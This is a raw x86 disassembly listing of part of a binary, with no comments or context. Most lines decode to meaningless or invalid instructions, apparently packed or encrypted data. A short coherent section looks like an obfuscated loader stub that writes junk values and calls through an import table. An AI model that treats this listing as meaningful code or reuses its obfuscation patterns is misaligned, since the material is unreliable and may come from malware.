  40f1fc:	clc    
  40f1fd:	out    dx,al
  40f1fe:	pusha  
  40f1ff:	cmp    al,0x3c
  40f201:	push   ss
  40f202:	pop    edi
  40f203:	adc    WORD PTR [ecx],sp
  40f206:	cli    
  40f207:	shl    BYTE PTR [ebx+ecx*1+0x1e],1
  40f20b:	add    esi,0xffffffb2
  40f20e:	lahf   
  40f20f:	sub    eax,0xa7cf36e
  40f214:	or     al,0x77
  40f216:	push   0xa5228953
  40f21b:	(bad)  
  40f21c:	arpl   WORD PTR [esi],bx
  40f21e:	cmc    
  40f21f:	es jbe 0x40f27d
  40f222:	inc    edi
  40f223:	and    bh,BYTE PTR [ebx+0xb]
  40f226:	jb     0x40f281
  40f228:	cli    
  40f229:	mov    esp,?
  40f22b:	(bad)  
  40f22c:	fiadd  DWORD PTR [ecx+ebp*2-0x5a]
  40f230:	jecxz  0x40f1f3
  40f232:	repz ds add al,0xe0
  40f236:	popf   
  40f237:	dec    eax
  40f238:	inc    ecx
  40f239:	xor    DWORD PTR [esi-0x1c],esi
  40f23c:	mov    DWORD PTR [ebp-0x52c5e043],esp
  40f242:	loope  0x40f2ae
  40f244:	sbb    ch,BYTE PTR [ebp-0x76b8da7c]
  40f24a:	aaa    
  40f24b:	xor    BYTE PTR [ebp+0x74200a1],ah
  40f251:	xchg   ebx,eax
  40f252:	mov    ss,WORD PTR ds:0xef1b9b8c
  40f258:	mov    eax,ds:0x66e1a42
  40f25d:	push   eax
  40f25e:	fbld   TBYTE PTR [eax+0x55]
  40f261:	inc    esi
  40f262:	xchg   ecx,eax
  40f263:	jbe    0x40f28d
  40f265:	repz aaa 
  40f267:	xlat   BYTE PTR ds:[ebx]
  40f268:	dec    ecx
  40f269:	jl     0x40f29b
  40f26b:	mov    ds:0x4d27a79d,al
  40f270:	mov    ds:0x8130f9fd,al
  40f275:	cmp    ch,dh
  40f277:	cld    
  40f278:	stos   DWORD PTR es:[edi],eax
  40f279:	pop    esi
  40f27a:	arpl   WORD PTR [eax],dx
  40f27c:	cmp    BYTE PTR [ecx],ch
  40f27e:	retf   0xfb21
  40f281:	hlt    
  40f282:	out    0x74,eax
  40f284:	retf   0xd0f3
  40f287:	push   ss
  40f288:	sar    cl,cl
  40f28a:	mov    esp,0xecd29f6b
  40f28f:	xchg   edi,eax
  40f290:	scas   eax,DWORD PTR es:[edi]
  40f291:	mov    ch,0x8c
  40f293:	mov    dl,0x48
  40f295:	mov    ecx,DWORD PTR [eax*1-0x69f7dcf8]
  40f29c:	(bad)  
  40f29d:	(bad)  
  40f29f:	inc    eax
  40f2a0:	pop    edi
  40f2a1:	mov    BYTE PTR [ebx+0x10],ch
  40f2a4:	repz pop ss
  40f2a6:	push   ebx
  40f2a7:	mov    ecx,0x5fe20e43
  40f2ac:	xchg   edi,eax
  40f2ad:	pop    es
  40f2ae:	mov    al,0xc9
  40f2b0:	sahf   
  40f2b1:	mov    ah,0x51
  40f2b3:	out    0xb3,eax
  40f2b5:	addr16 ret 0x87d8
  40f2b9:	add    bh,BYTE PTR [edx-0x3308a6e]
  40f2bf:	or     al,0xf8
  40f2c1:	call   0xebe6:0xe298b0c3
  40f2c8:	jmp    0x40f32a
  40f2ca:	es jae 0x40f343
  40f2cd:	outs   dx,DWORD PTR ds:[esi]
  40f2ce:	push   edx
  40f2cf:	enter  0x7347,0x21
  40f2d3:	imul   ebx,DWORD PTR [edx+0x38edd742],0x41
  40f2da:	rol    edi,0xd4
  40f2dd:	mov    bl,0x96
  40f2df:	and    bh,BYTE PTR [esi+ebp*2-0x2702f296]
  40f2e6:	pop    es
  40f2e7:	int3   
  40f2e8:	nop
  40f2e9:	sar    bh,0x9
  40f2ec:	test   edx,edx
  40f2ee:	loope  0x40f2b5
  40f2f0:	pop    ebx
  40f2f1:	icebp  
  40f2f2:	(bad)  
  40f2f3:	hlt    
  40f2f4:	jnp    0x40f28c
  40f2f6:	cld    
  40f2f7:	fisttp DWORD PTR [edx+0x1c]
  40f2fa:	xchg   ebp,eax
  40f2fb:	dec    edi
  40f2fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2fd:	gs pushf 
  40f2ff:	pusha  
  40f300:	pop    esi
  40f301:	jmp    0x40f310
  40f303:	add    bl,BYTE PTR [ebx+0x69]
  40f306:	leave  
  40f307:	pavgb  mm4,QWORD PTR [ecx]
  40f30a:	clc    
  40f30b:	bound  ebx,QWORD PTR [edx+0x6d]
  40f30e:	mov    esi,0xc084a87a
  40f313:	sbb    BYTE PTR [edi],bh
  40f315:	mov    ebp,DWORD PTR [ebx+0x22]
  40f318:	ror    BYTE PTR [esi+0x22],0x47
  40f31c:	or     BYTE PTR [ecx-0x24],dl
  40f31f:	ins    DWORD PTR es:[edi],dx
  40f320:	push   es
  40f321:	jno    0x40f380
  40f323:	jmp    0x914174ee
  40f328:	jp     0x40f3a7
  40f32a:	outs   dx,BYTE PTR ds:[esi]
  40f32c:	ins    BYTE PTR es:[edi],dx
  40f32d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f32e:	push   edi
  40f32f:	popf   
  40f330:	xlat   BYTE PTR ds:[ebx]
  40f331:	jp     0x40f39f
  40f333:	cdq    
  40f334:	(bad)  
  40f335:	shl    dl,0xe3
  40f338:	mov    esi,0x21a152ce
  40f33d:	jne    0x40f2dc
  40f33f:	adc    edx,DWORD PTR [ebx]
  40f341:	push   cs
  40f342:	or     ebp,DWORD PTR [ecx+0xf7c433c]
  40f348:	xchg   esi,eax
  40f349:	mov    eax,DWORD PTR ds:0x2aa84f6e
  40f34f:	sahf   
  40f350:	jns    0x40f373
  40f352:	mov    esp,0x777a2291
  40f357:	fistp  DWORD PTR [eax]
  40f359:	or     ch,dh
  40f35b:	stos   BYTE PTR es:[edi],al
  40f35c:	ret    0xcd85
  40f35f:	xchg   DWORD PTR [edi+0x3364b0f5],esi
  40f365:	sti    
  40f366:	test   al,0x53
  40f368:	jns    0x40f3aa
  40f36a:	jmp    0x9684:0x8336efb7
  40f371:	call   DWORD PTR [eax]
  40f373:	mov    ch,0x92
  40f375:	xchg   esp,eax
  40f376:	xor    DWORD PTR [ebx-0x113a411d],ebp
  40f37c:	rcr    ebx,cl
  40f37e:	jecxz  0x40f393
  40f380:	call   0x1362:0x93cc5c76
  40f387:	sbb    eax,0x56cebe9e
  40f38c:	and    al,0xc4
  40f38e:	jecxz  0x40f319
  40f390:	pusha  
  40f391:	pusha  
  40f392:	inc    eax
  40f393:	xor    DWORD PTR [esi],ecx
  40f395:	iret   
  40f396:	ins    BYTE PTR es:[edi],dx
  40f397:	fld    QWORD PTR [esi+0x20b963b9]
  40f39d:	add    ebp,DWORD PTR [eax+0x68]
  40f3a0:	les    ebp,FWORD PTR [esi]
  40f3a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3a3:	mov    bl,0xf7
  40f3a5:	and    DWORD PTR [edi],esp
  40f3a7:	lods   eax,DWORD PTR ds:[esi]
  40f3a8:	test   eax,0xdb9451a8
  40f3ad:	out    0xf4,al
  40f3af:	dec    esi
  40f3b0:	jmp    0x40f350
  40f3b2:	jg     0x40f404
  40f3b4:	bound  esi,QWORD PTR [eax+0x3509627b]
  40f3ba:	(bad)  
  40f3bb:	jo     0x40f36e
  40f3bd:	pop    esp
  40f3be:	test   eax,0x3f9bbaa0
  40f3c3:	sti    
  40f3c4:	in     eax,dx
  40f3c5:	jb     0x40f3a9
  40f3c7:	adc    al,0xbf
  40f3c9:	sar    BYTE PTR [eax-0x5db5e54c],cl
  40f3cf:	ret    
  40f3d0:	push   edi
  40f3d1:	xor    edx,0x6d49a995
  40f3d7:	outs   dx,DWORD PTR ds:[esi]
  40f3d8:	into   
  40f3d9:	mov    ebp,0x1ae89d29
  40f3de:	add    esi,DWORD PTR [edi+edx*8+0x73]
  40f3e2:	inc    ebp
  40f3e3:	push   ss
  40f3e4:	dec    ebx
  40f3e5:	retf   
  40f3e6:	dec    ebp
  40f3e7:	test   bh,dl
  40f3e9:	shr    DWORD PTR [ebx+0x5b71ec6f],cl
  40f3ef:	outs   dx,DWORD PTR ds:[esi]
  40f3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3f1:	push   cs
  40f3f2:	popf   
  40f3f3:	setle  BYTE PTR [ecx]
  40f3f6:	pop    ebp
  40f3f7:	jnp    0x40f422
  40f3f9:	test   DWORD PTR [eax-0xb],ebx
  40f3fc:	xchg   BYTE PTR [ebx],ah
  40f3fe:	add    al,0xab
  40f400:	xchg   edx,eax
  40f401:	pop    es
  40f402:	mov    ebx,0x550d6e34
  40f407:	fbld   TBYTE PTR [eax-0x1e]
  40f40a:	pop    edi
  40f40b:	inc    esi
  40f40c:	push   esp
  40f40d:	js     0x40f3b9
  40f40f:	loope  0x40f479
  40f411:	jnp    0x40f3a5
  40f413:	clc    
  40f414:	inc    ecx
  40f415:	jg     0x40f456
  40f417:	mov    ebp,0x1bb685a0
  40f41c:	adc    BYTE PTR [ebp+eiz*1-0x2270c932],dl
  40f423:	cmp    BYTE PTR [eax-0x37],al
  40f426:	leave  
  40f427:	ins    DWORD PTR es:[edi],dx
  40f428:	dec    edx
  40f429:	mov    dh,0xa1
  40f42b:	or     bh,BYTE PTR [ebx]
  40f42d:	jb     0x40f44a
  40f42f:	mov    eax,ds:0x26b0a2dd
  40f434:	shl    DWORD PTR [edx+0x14b9508b],1
  40f43a:	pushf  
  40f43b:	jb     0x40f4a8
  40f43d:	retf   0xb7eb
  40f440:	xor    ah,BYTE PTR [ebp-0x49]
  40f443:	hlt    
  40f444:	xchg   esi,eax
  40f445:	mov    al,0x90
  40f447:	and    DWORD PTR [ecx],ecx
  40f449:	and    esp,DWORD PTR [edi-0x70]
  40f44c:	nop
  40f44d:	or     BYTE PTR [esi+0x43],cl
  40f450:	test   al,0xde
  40f452:	stos   DWORD PTR es:[edi],eax
  40f453:	call   0x6afe28a8
  40f458:	and    cl,ch
  40f45a:	jge    0x40f486
  40f45c:	and    ch,BYTE PTR [ecx]
  40f45e:	mov    dh,0x6e
  40f460:	test   eax,0x6cb5d4f5
  40f465:	aad    0x4b
  40f467:	cli    
  40f468:	push   0xb043fd96
  40f46d:	mov    BYTE PTR [ebp-0x73],dh
  40f470:	ss pop esp
  40f472:	xor    eax,0xfbfc067
  40f477:	xchg   ebp,eax
  40f478:	mov    ebp,0xdf504949
  40f47d:	pop    ebx
  40f47e:	cdq    
  40f47f:	sbb    dh,BYTE PTR [ecx+ebp*1+0x56b132bd]
  40f486:	imul   esp,DWORD PTR [ecx-0xfe73350],0xffffffb4
  40f48d:	retf   
  40f48e:	inc    edx
  40f48f:	scas   eax,DWORD PTR es:[edi]
  40f490:	imul   esi,DWORD PTR [edi-0x638ae750],0x25b7343c
  40f49a:	xchg   ebx,eax
  40f49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f49c:	enter  0xf585,0x5e
  40f4a0:	cld    
  40f4a1:	loop   0x40f522
  40f4a3:	out    dx,al
  40f4a4:	xchg   esp,eax
  40f4a5:	mov    ds:0xac78dd22,al
  40f4aa:	cdq    
  40f4ab:	out    dx,eax
  40f4ac:	pop    ebx
  40f4ad:	inc    ebp
  40f4ae:	cmp    ah,BYTE PTR [ecx-0x2349cef3]
  40f4b4:	pop    ss
  40f4b5:	add    DWORD PTR ds:0x722675e0,ebp
  40f4bb:	pop    ecx
  40f4bc:	xor    al,0x0
  40f4be:	push   edx
  40f4bf:	repnz lds edi,FWORD PTR [edi+0x70]
  40f4c3:	and    ch,BYTE PTR [ebx-0x47]
  40f4c6:	shl    BYTE PTR [eax],0xeb
  40f4c9:	repz loop 0x40f544
  40f4cc:	call   0xdba9cc1e
  40f4d1:	aad    0xfa
  40f4d3:	repz scas al,BYTE PTR es:[edi]
  40f4d5:	popf   
  40f4d6:	es sub eax,0xed85d726
  40f4dc:	je     0x40f4c9
  40f4de:	jnp    0x40f4fc
  40f4e0:	jns    0x40f4ab
  40f4e2:	xchg   ebx,eax
  40f4e3:	bound  edx,QWORD PTR ds:[eax]
  40f4e6:	jne    0x40f519
  40f4e8:	pushf  
  40f4e9:	iret   
  40f4ea:	test   eax,0x5151fa3b
  40f4ef:	mov    eax,0xf89c8539
  40f4f4:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  40f4fb:	mov    DWORD PTR ds:0x4345fb,0x36a0
  40f505:	push   esi
  40f506:	mov    ecx,DWORD PTR ds:0x43460b
  40f50c:	mov    DWORD PTR [ebp-0x8],eax
  40f50f:	mov    ecx,DWORD PTR [ebp+0x8]
  40f512:	mov    DWORD PTR ds:0x4345d3,0x6a14
  40f51c:	push   edi
  40f51d:	mov    DWORD PTR ds:0x4345ff,0x48b4
  40f527:	mov    edi,0x7510851
  40f52c:	mov    DWORD PTR ds:0x43453f,0x7e06
  40f536:	mov    esi,0x327299
  40f53b:	mov    DWORD PTR ds:0x43458b,0x7203
  40f545:	cmp    ecx,eax
  40f547:	je     0x40fd56
  40f54d:	or     eax,eax
  40f54f:	jmp    0x40f8e2
  40f554:	cmc    
  40f555:	pop    esp
  40f556:	inc    ebp
  40f557:	gs ins DWORD PTR es:[edi],dx
  40f559:	jge    0x40f550
  40f55b:	pop    esp
  40f55c:	push   0xffffffac
  40f55e:	add    ah,BYTE PTR [esi+0x5c]
  40f561:	push   0xffffffe0
  40f563:	inc    edx
  40f564:	sahf   
  40f565:	mov    cl,0x7e
  40f567:	jle    0x40f55d
  40f569:	jns    0x40f5e9
  40f56b:	jle    0x40f511
  40f56d:	dec    ecx
  40f56e:	cmp    ecx,DWORD PTR [edi+0x3dd7d07a]
  40f574:	xchg   edi,eax
  40f575:	fcom   DWORD PTR [esi-0x1a630041]
  40f57b:	xor    ch,BYTE PTR [ecx+0x43]
  40f57e:	imul   ebx,esp,0x8472190
  40f584:	mov    esi,0x3c8e7efd
  40f589:	(bad)  
  40f58a:	lock dec esp
  40f58c:	out    0x5a,eax
  40f58e:	push   esp
  40f58f:	push   es
  40f590:	das    
  40f591:	daa    
  40f592:	xchg   edx,eax
  40f593:	sbb    ah,BYTE PTR [edx]
  40f595:	icebp  
  40f596:	mov    BYTE PTR [eax+0x556d7557],dh
  40f59c:	(bad)  
  40f59d:	xchg   esi,eax
  40f59e:	mov    ebx,0x7ae4c064
  40f5a3:	ins    BYTE PTR es:[edi],dx
  40f5a4:	bound  ebx,QWORD PTR [ebx+ecx*2+0x3d]
  40f5a8:	xor    eax,0xe2d7dcce
  40f5ad:	scas   eax,DWORD PTR es:[edi]
  40f5ae:	sbb    BYTE PTR [ecx],0x37
  40f5b1:	int    0x3e
  40f5b3:	ins    BYTE PTR es:[edi],dx
  40f5b4:	sub    al,0x90
  40f5b6:	(bad)  
  40f5b7:	push   ebp
  40f5b8:	xor    ah,BYTE PTR [edx]
  40f5ba:	push   ds
  40f5bb:	xchg   ebx,eax
  40f5bc:	loopne 0x40f5ef
  40f5be:	mov    ebx,0x306f32d5
  40f5c3:	dec    ebx
  40f5c4:	out    dx,al
  40f5c5:	mov    ebx,esp
  40f5c7:	jge    0x40f5a5
  40f5c9:	lock mov ebx,0x4be2a65b
  40f5cf:	and    DWORD PTR [ebp+0x11],edx
  40f5d2:	or     esp,DWORD PTR [edi+0x312ba468]
  40f5d8:	in     eax,dx
  40f5d9:	icebp  
  40f5da:	shl    BYTE PTR [esi],cl
  40f5dc:	stos   BYTE PTR es:[edi],al
  40f5dd:	add    al,0x9f
  40f5df:	lds    edx,FWORD PTR [edx+0x55]
  40f5e2:	daa    
  40f5e3:	adc    al,0x80
  40f5e5:	lea    esp,[edi+0x67f1fd00]
  40f5eb:	icebp  
  40f5ec:	(bad)  
  40f5ed:	in     eax,dx
  40f5ee:	hlt    
  40f5ef:	imul   edi,DWORD PTR [ecx-0x428d37f0],0xffffffa4
  40f5f6:	inc    ecx
  40f5f7:	jl     0x40f646
  40f5f9:	mov    edi,0xafe3e8c2
  40f5fe:	ficom  DWORD PTR [ebx]
  40f600:	stos   BYTE PTR es:[edi],al
  40f601:	xchg   edi,eax
  40f602:	jge    0x40f599
  40f604:	inc    ecx
  40f605:	mov    WORD PTR fs:[edi],fs
  40f608:	dec    esi
  40f609:	or     ecx,DWORD PTR [edi-0x2311b80f]
  40f60f:	shl    BYTE PTR [ebp-0x472bf7a],0x84
  40f616:	xchg   esp,eax
  40f617:	fist   WORD PTR [ebx]
  40f619:	mov    ebx,esp
  40f61b:	pop    esp
  40f61c:	or     edi,0x10
  40f61f:	mov    ch,0x1f
  40f621:	dec    ebx
  40f622:	in     al,dx
  40f623:	jmp    0x5d14:0xdcaf1a33
  40f62a:	sub    BYTE PTR [ebx-0x7884b93e],al
  40f630:	sub    bh,BYTE PTR es:[ebx]
  40f633:	xor    BYTE PTR [esi+0x56c8378a],ch
  40f639:	les    ebx,FWORD PTR [edi+0x224e9cfa]
  40f63f:	jecxz  0x40f6b0
  40f641:	stos   DWORD PTR es:[edi],eax
  40f642:	popf   
  40f643:	arpl   WORD PTR [ebx+0x1ea1010b],di
  40f649:	xchg   BYTE PTR [ebp+esi*1+0x13],bh
  40f64d:	xchg   edx,eax
  40f64e:	xor    eax,0xcc0e65b9
  40f653:	lods   eax,DWORD PTR ds:[esi]
  40f654:	and    eax,DWORD PTR [ebx]
  40f656:	mov    ebp,0x50610ef6
  40f65b:	mov    cl,0xf4
  40f65d:	mov    ds:0xce9c986e,al
  40f662:	jmp    0x40f66a
  40f664:	repnz push es
  40f666:	mov    cl,ah
  40f668:	and    BYTE PTR [ecx-0x17],bl
  40f66b:	jns    0x40f669
  40f66d:	mov    DWORD PTR [edi-0x47],ebx
  40f670:	xor    ebx,DWORD PTR [edx+0x4dc59f4b]
  40f676:	mov    ds:0xef1ad242,eax
  40f67b:	and    eax,DWORD PTR [edi]
  40f67d:	pop    edi
  40f67e:	sahf   
  40f67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f680:	inc    edx
  40f681:	mov    ch,BYTE PTR [eax+0x72d7ac97]
  40f687:	sahf   
  40f688:	push   esp
  40f689:	jnp    0x40f6e0
  40f68b:	fsubr  st(6),st
  40f68d:	addr16 iret 
  40f68f:	xchg   ebx,eax
  40f690:	lea    edx,[eax+0x5f268373]
  40f696:	adc    ah,BYTE PTR [ecx-0x21]
  40f699:	push   edx
  40f69a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f69b:	mov    bl,0x56
  40f69e:	aad    0x37
  40f6a0:	mov    ah,0x7f
  40f6a2:	jbe    0x40f62d
  40f6a4:	iret   
  40f6a5:	jmp    0x30d0:0xea188ee
  40f6ac:	inc    esp
  40f6ad:	inc    ecx
  40f6ae:	xchg   DWORD PTR [ecx+eax*1],edx
  40f6b1:	push   ebp
  40f6b2:	sub    eax,0x65ffab35
  40f6b7:	out    0x68,al
  40f6b9:	mov    edx,0xdfa61642
  40f6be:	enter  0xf81,0xab
  40f6c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6c3:	(bad)  
  40f6c4:	fidiv  DWORD PTR fs:[edx+0x74]
  40f6c8:	add    edx,DWORD PTR cs:[edi+0x57814dd]
  40f6cf:	jns    0x40f6f4
  40f6d1:	cli    
  40f6d2:	sbb    eax,0xb4a14d7d
  40f6d7:	mov    ch,0x98
  40f6d9:	mov    eax,0x8e91f516
  40f6de:	xchg   ecx,eax
  40f6df:	js     0x40f704
  40f6e1:	cmp    bh,dl
  40f6e3:	mov    eax,ds
  40f6e5:	cli    
  40f6e6:	sbb    BYTE PTR [edx],ah
  40f6e8:	pushf  
  40f6e9:	jbe    0x40f6ae
  40f6eb:	sahf   
  40f6ec:	ss cs push esp
  40f6ef:	loopne 0x40f6ec
  40f6f1:	repnz addr16 cld 
  40f6f4:	dec    ecx
  40f6f5:	dec    ecx
  40f6f6:	inc    esi
  40f6f7:	mov    ebx,DWORD PTR [ebx]
  40f6f9:	cmp    ecx,DWORD PTR [ebx-0x68231d79]
  40f6ff:	push   ss
  40f700:	push   cs
  40f701:	mov    ecx,edx
  40f703:	mov    eax,ds:0x74237773
  40f708:	adc    al,0xef
  40f70a:	test   al,0x11
  40f70c:	push   cs
  40f70d:	or     al,0x4a
  40f70f:	retf   0xf641
  40f712:	mov    WORD PTR [esi+0x12b8c47],ss
  40f718:	cmp    BYTE PTR [esi+0x14d913f7],ah
  40f71e:	ja     0x40f79d
  40f720:	popf   
  40f721:	popf   
  40f722:	jecxz  0x40f777
  40f724:	shr    BYTE PTR [eax],cl
  40f726:	test   al,0xa9
  40f728:	cli    
  40f729:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f72a:	add    ecx,DWORD PTR [eax+0x3e656b43]
  40f730:	in     al,0x2d
  40f732:	repz inc ebp
  40f734:	sub    DWORD PTR [edx-0x1b70fdda],0xffffffd9
  40f73b:	push   ss
  40f73c:	jmp    0x811d1b74
  40f741:	pushf  
  40f742:	fcom   DWORD PTR [edi]
  40f744:	add    DWORD PTR [eax],eax
  40f746:	pop    esi
  40f747:	mov    BYTE PTR [edi-0x57b94554],al
  40f74d:	je     0x40f70f
  40f74f:	and    BYTE PTR [ebx],cl
  40f751:	xor    al,0xe1
  40f753:	fdiv   DWORD PTR [eax+0x4c154304]
  40f759:	inc    ecx
  40f75a:	sub    BYTE PTR [edx+0xbf6e1fc],al
  40f760:	adc    esi,ecx
  40f762:	div    DWORD PTR [edx-0x79]
  40f765:	jge    0x40f6fd
  40f767:	(bad)  
  40f768:	pop    esp
  40f769:	sti    
  40f76a:	mov    bh,0x82
  40f76c:	ds (bad) 
  40f76e:	in     eax,0x12
  40f770:	xchg   ebx,eax
  40f771:	ret    
  40f772:	out    0xc4,eax
  40f774:	fdiv   DWORD PTR [ebp+0x36]
  40f777:	adc    bh,cl
  40f779:	fistp  DWORD PTR [edi-0x2298fd38]
  40f77f:	and    ah,BYTE PTR [esi+0x363634f]
  40f785:	mov    bl,0xf
  40f787:	mov    ds:0x8746d6d7,al
  40f78c:	and    eax,0xf1f38ce9
  40f791:	xor    ah,BYTE PTR [bp-0x7950]
  40f796:	popf   
  40f797:	mov    al,ds:0x5c7be426
  40f79c:	in     al,0xa3
  40f79e:	mov    edx,0x8bd5e1db
  40f7a3:	es sbb dl,0xe8
  40f7a7:	jge    0x40f789
  40f7a9:	les    ebp,FWORD PTR [esi-0x61d58d04]
  40f7af:	nop
  40f7b0:	push   es
  40f7b1:	clc    
  40f7b2:	push   es
  40f7b3:	ja     0x40f822
  40f7b5:	lock out dx,al
  40f7b7:	push   0x80f30330
  40f7bc:	dec    esp
  40f7bd:	mov    esi,esp
  40f7bf:	xor    ebp,eax
  40f7c1:	xlat   BYTE PTR ds:[ebx]
  40f7c2:	fwait
  40f7c3:	aaa    
  40f7c4:	mov    ebx,0x4b5591a9
  40f7c9:	dec    esi
  40f7ca:	fwait
  40f7cb:	aaa    
  40f7cc:	mov    bl,BYTE PTR [edi+0x2a62853f]
  40f7d2:	adc    eax,0xa667fc62
  40f7d7:	adc    BYTE PTR [ecx+0x17db6ddf],ah
  40f7dd:	mov    bl,dh
  40f7df:	call   0x7113:0x73184257
  40f7e6:	lods   eax,DWORD PTR fs:[esi]
  40f7e8:	or     eax,DWORD PTR [ecx+0x3a]
  40f7eb:	ret    0xcb8a
  40f7ee:	mov    ch,0xd1
  40f7f0:	ds dec ebx
  40f7f2:	test   BYTE PTR [ecx+0x53],dh
  40f7f5:	in     al,dx
  40f7f6:	ja     0x40f7c0
  40f7f8:	enter  0x1966,0xd3
  40f7fc:	add    al,0x8d
  40f7fe:	in     eax,dx
  40f7ff:	(bad)  [esi]
  40f801:	in     al,dx
  40f802:	mov    esi,0x758ce54f
  40f807:	dec    esp
  40f808:	push   edx
  40f809:	fadd   DWORD PTR [ecx-0x34d51842]
  40f80f:	mov    bh,0xfd
  40f811:	out    0x12,al
  40f813:	in     al,0xc2
  40f815:	dec    ebx
  40f816:	pop    esp
  40f817:	pusha  
  40f818:	xchg   esp,eax
  40f819:	or     BYTE PTR [ebp-0x3cf1bf57],dh
  40f81f:	inc    ebp
  40f820:	push   edi
  40f821:	sbb    eax,0x77820f21
  40f826:	pop    esi
  40f827:	ins    BYTE PTR es:[edi],dx
  40f828:	int3   
  40f829:	int3   
  40f82a:	sbb    eax,0x6a0a6473
  40f82f:	aam    0x51
  40f831:	into   
  40f832:	sahf   
  40f833:	arpl   WORD PTR [esi-0x4ed7c7f5],bp
  40f839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f83a:	mov    al,ch
  40f83c:	jno    0x40f875
  40f83e:	fnstenv ds:0x35b87584
  40f844:	push   esp
  40f845:	jmp    0x2b5d936f
  40f84a:	mov    esp,0x4ba06c8c
  40f84f:	das    
  40f850:	push   ebp
  40f851:	fs pop ecx
  40f853:	mov    ?,WORD PTR [esi]
  40f855:	mov    dl,0xac
  40f857:	xor    BYTE PTR [eax+0x9cc9345],cl
  40f85d:	aam    0xd6
  40f85f:	or     al,0xe
  40f861:	stos   DWORD PTR es:[edi],eax
  40f862:	mov    esp,DWORD PTR ss:[ecx-0x2939d673]
  40f869:	dec    eax
  40f86a:	xchg   esi,esp
  40f86c:	int    0xb2
  40f86e:	jns    0x40f84a
  40f870:	add    ebx,edx
  40f872:	sbb    al,0xeb
  40f874:	(bad)
  40f878:	or     bl,cl
  40f87a:	or     eax,0x2b37d542
  40f87f:	add    DWORD PTR [esi],esi
  40f881:	enter  0x82b0,0xc2
  40f885:	pop    edx
  40f886:	or     esp,edx
  40f888:	add    dl,bl
  40f88a:	out    0xf,eax
  40f88c:	fmul   st(6),st
  40f88e:	js     0x40f89b
  40f890:	xor    al,0x2e
  40f892:	jge    0x40f86f
  40f894:	outs   dx,BYTE PTR ds:[esi]
  40f895:	inc    ebp
  40f896:	add    ebp,DWORD PTR [eax+0x43a7f05f]
  40f89c:	and    eax,0x4d8f7289
  40f8a1:	mov    eax,DWORD PTR [ecx-0x12]
  40f8a4:	into   
  40f8a5:	cmp    al,0xf5
  40f8a7:	retf   
  40f8a8:	xchg   ebp,eax
  40f8a9:	jmp    FWORD PTR [ebp-0x23f9b6c6]
  40f8af:	pusha  
  40f8b0:	adc    eax,0xdf35610f
  40f8b5:	shl    BYTE PTR [ebx],cl
  40f8b7:	stos   BYTE PTR es:[edi],al
  40f8b8:	hlt    
  40f8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8ba:	add    ecx,0x1b0129ba
  40f8c0:	jae    0x40f8a9
  40f8c2:	inc    edx
  40f8c3:	mov    ah,0xc2
  40f8c5:	sub    BYTE PTR [eax],bl
  40f8c7:	fsub   QWORD PTR [ebp-0x29]
  40f8ca:	pop    esp
  40f8cb:	jmp    0xddd934c2
  40f8d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8d1:	jle    0x40f944
  40f8d3:	aam    0x5a
  40f8d5:	mov    ebp,0xac1c4491
  40f8da:	dec    ebx
  40f8db:	pop    esp
  40f8dc:	ficom  DWORD PTR es:[edi+eax*4+0x458b3e8b]
  40f8e4:	cld    
  40f8e5:	mov    ecx,DWORD PTR [ebp+0xc]
  40f8e8:	xor    DWORD PTR ds:0x43453f,0x4345cf
  40f8f2:	xor    eax,edi
  40f8f4:	add    eax,esi
  40f8f6:	mov    DWORD PTR ds:0x43458b,0x4bab
  40f900:	cmp    eax,ecx
  40f902:	mov    DWORD PTR ds:0x43460f,0x3e53
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434593,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x4344eb
  40f921:	xor    DWORD PTR ds:0x434553,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x4345bf,0x0
  40f933:	mov    edx,DWORD PTR ds:0x4345bf
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x4345bf,edx
  40f940:	cmp    DWORD PTR ds:0x4345bf,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x43454b
  40f952:	push   0x434692
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x4345bf,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x4345bf
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x4345bf,edx
  40f986:	cmp    DWORD PTR ds:0x4345bf,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x4345bf,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	cmp    ch,BYTE PTR [edx-0x42ebb90e]
  40f9bf:	jle    0x40fa3f
  40f9c1:	hlt    
  40f9c2:	jns    0x40fa42
  40f9c4:	jle    0x40f994
  40f9c6:	sub    BYTE PTR [esi+0x3645f4fe],0x46
  40f9cd:	pop    ebp
  40f9ce:	push   eax
  40f9cf:	inc    edi
  40f9d0:	sahf   
  40f9d1:	add    BYTE PTR [ebx-0x24],cl
  40f9d4:	add    al,0xba
  40f9d6:	xchg   dh,bh
  40f9d8:	dec    edx
  40f9d9:	xlat   BYTE PTR ds:[ebx]
